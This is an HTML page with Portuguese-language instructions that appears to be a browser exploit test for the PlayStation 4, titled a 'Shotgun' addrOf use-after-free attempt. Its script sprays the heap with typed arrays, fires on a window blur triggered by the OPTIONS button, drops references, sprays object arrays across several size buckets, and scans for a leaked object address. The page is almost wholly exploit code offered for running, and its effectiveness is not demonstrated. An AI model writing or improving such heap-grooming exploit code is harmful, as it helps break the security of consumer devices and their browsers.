
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF: "Shotgun" AddrOf Test</title>
<style>
    body { background-color: #111; color: #eee; font-family: 'Courier New', monospace; text-align: center; }
    h1 { color: #ffcc00; }
    .status { border: 2px solid #ffcc00; padding: 15px; margin: 20px auto; max-width: 700px; background: #222; }
    button { background: #990000; color: white; border: none; padding: 15px 40px; font-size: 1.3em; cursor: pointer; font-weight: bold; border-radius: 5px;}
    button:hover { background: #ff0000; }
    #log { text-align: left; margin: 20px auto; max-width: 800px; white-space: pre-wrap; background: #000; padding: 10px; border: 1px solid #444; min-height: 300px; font-size: 0.9em; overflow-y: auto; max-height: 500px;}
    .addr { color: #00ffff; font-weight: bold; font-size: 1.2em;}
    .highlight { color: yellow; }
</style>
</head>
<body>

<h1>PS4 UAF: "Shotgun" AddrOf Primitive 2</h1>

<div class="status" id="msg">
    <b>INSTRUÇÕES ATUALIZADAS:</b><br><br>
    1. Clique em "INICIAR EXPLOIT DE ÁREA".<br>
    2. Aguarde até aparecer: <span class="highlight">"Memória PRONTA. Aperte OPTIONS agora!"</span><br>
    3. Aperte "OPTIONS". <b>Aguarde cerca de 5-10 segundos sem tocar em nada.</b><br>
    4. O console pode travar um pouco devido à pressão na memória.
</div>

<button id="btn" onclick="fire()">INICIAR EXPLOIT DE ÁREA</button>

<div id="log">Logs do sistema...</div>

<script>
    const Msg = document.getElementById('msg');
    const Log = document.getElementById('log');
    const Btn = document.getElementById('btn');
    
    function log(txt) { 
        Log.innerHTML += txt + "\n"; 
        Log.scrollTop = Log.scrollHeight; // Auto-scroll
    }

    // Converte Float para Hex String
    function floatToHex(val) {
        let buf = new ArrayBuffer(8);
        let view = new DataView(buf);
        view.setFloat64(0, val, true);
        let hex = "0x";
        for(let i=0; i<8; i++) hex += view.getUint8(7-i).toString(16).padStart(2,'0');
        return hex;
    }

    let controller_arrays = [];
    let target_arrays = [];
    // Aumentamos a contagem total pois vamos dividir o spray
    const SPRAY_COUNT = 50000; 
    
    // Objeto Vítima
    let leak_object = { id: "PS4_KERNEL_SECRETS", val: 1337 };

    // Lista de tamanhos para o ataque de "escopeta" (Shotgun Spray)
    // Tentamos cobrir vários "buckets" de alocação de memória.
    const SIZES_TO_SPRAY = [12, 14, 16, 20, 24, 32, 48, 64, 96, 128];

    function fire() {
        Btn.disabled = true;
        Btn.innerText = "EXECUTANDO...";
        Msg.innerText = "Preparando Heap (Fase 1)... Aguarde.";
        log("[*] Iniciando alocação de memória massiva...");

        setTimeout(prepareHeap, 100); // Pequeno delay para atualizar a UI
    }

    function prepareHeap() {
        // --- FASE 1: GROOMING ---
        try {
            for(let i = 0; i < SPRAY_COUNT; i++) {
                let ctrl = new Float64Array(16);
                ctrl[0] = i; 
                controller_arrays.push(ctrl);

                let target = new Float64Array(16);
                target.fill(1.1);
                target_arrays.push(target);
            }
        } catch(e) { log("[!] Erro crítico na alocação: " + e); return; }

        Msg.innerHTML = "<h2 class='highlight'>Memória PRONTA. Aperte OPTIONS agora!</h2>";
        log("[*] Heap preparado. Aguardando gatilho 'onblur'...");

        // Fullscreen trigger
        const doc = document.documentElement;
        if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        else if (doc.requestFullscreen) doc.requestFullscreen();

        // --- FASE 2: GATILHO & SHOTGUN SPRAY ---
        window.onblur = function() {
            document.body.style.background = "#333"; // Feedback visual de início
            log("[*] Blur detectado! Iniciando SHOTGUN SPRAY...");
            
            // 1. FREE
            target_arrays = null; 

            // 2. SPRAY MULTI-TAMANHO
            let object_spray_storage = [];
            // Calculamos quantos de cada tamanho vamos fazer para não explodir a RAM
            let mini_spray_count = (SPRAY_COUNT * 1.5) / SIZES_TO_SPRAY.length;

            try {
                for(let s = 0; s < SIZES_TO_SPRAY.length; s++) {
                    let currentSize = SIZES_TO_SPRAY[s];
                    log(`[>] Spraying arrays de tamanho: ${currentSize}`);
                    
                    for(let i=0; i < mini_spray_count; i++) {
                        // Cria o array do tamanho específico preenchido com o objeto
                        let arr = new Array(currentSize).fill(leak_object);
                        object_spray_storage.push(arr);
                    }
                }
            } catch(e) { log("[!] Erro durante o spray (Memória cheia?): " + e); }

            log("[*] Spray concluído. Verificando resultados...");
            setTimeout(checkResult, 500); // Dá um tempo para a memória assentar
        };
    }

    function checkResult() {
        // --- FASE 3: VERIFICAÇÃO ---
        let success = false;

        for(let i = 0; i < SPRAY_COUNT; i++) {
            try {
                let val = controller_arrays[i][0];
                // Verifica se é um ponteiro válido (número grande, não NaN)
                if (val > 10000 && !isNaN(val)) {
                    let hexAddr = floatToHex(val);
                    // Filtro básico para endereços de userland
                    if (hexAddr.startsWith("0x0000")) {
                        success = true;
                        document.body.style.background = "#002266"; // TELA AZUL DA VITÓRIA
                        
                        Msg.innerHTML = "<h1 style='color:#00ff00'>SUCESSO: ADDROF CONFIRMADO!</h1>";
                        log("\n" + "=".repeat(50));
                        log(" [ $$$ BINGO! ENDEREÇO VAZADO $$$ ]");
                        log("=".repeat(50));
                        log("Controlador Index: " + i);
                        log("Endereço do Objeto na RAM: <span class='addr'>" + hexAddr + "</span>");
                        log("=".repeat(50));
                        log("Tire uma foto desta tela para o report!");
                        return;
                    }
                }
            } catch(e) {}
        }

        if (!success) {
            log("[-] Falha: A sobreposição não alinhou desta vez.");
            Msg.innerText = "Tentativa falhou. Recarregue a página e tente novamente.";
            document.body.style.background = "#440000"; // Tela Vermelha
            Btn.disabled = false;
            Btn.innerText = "TENTAR NOVAMENTE";
        }
    }
</script>
</body>
</html>

